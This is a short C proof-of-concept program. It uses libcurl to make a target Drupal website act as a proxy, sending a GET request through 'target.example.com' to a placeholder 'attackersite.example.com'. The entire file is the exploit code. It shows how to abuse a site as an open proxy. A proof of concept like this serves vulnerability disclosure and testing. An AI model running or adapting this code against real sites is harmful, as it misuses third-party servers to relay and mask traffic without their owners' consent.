/************************************************************************
 * Proof of concept for making a proxy GET request to a target drupal
 * website using libcurl
 ************************************************************************/
#include <curl/curl.h>

int main(int argc, char *argv[])
{
  CURLcode ret;
  CURL *hnd = curl_easy_init();
  curl_easy_setopt(hnd, CURLOPT_URL, "http://attackersite.example.com:80/");
  curl_easy_setopt(hnd, CURLOPT_PROXY, "http://target.example.com:80");
  curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
  curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/7.21.6 (x86_64-pc-linux-gnu) libcurl/7.21.6 OpenSSL/1.0.0e zlib/1.2.3.4 libidn/1.22 librtmp/2.3");
  curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
  curl_easy_setopt(hnd, CURLOPT_VERBOSE, 1L);
  ret = curl_easy_perform(hnd);
  curl_easy_cleanup(hnd);

  return (int)ret;
}

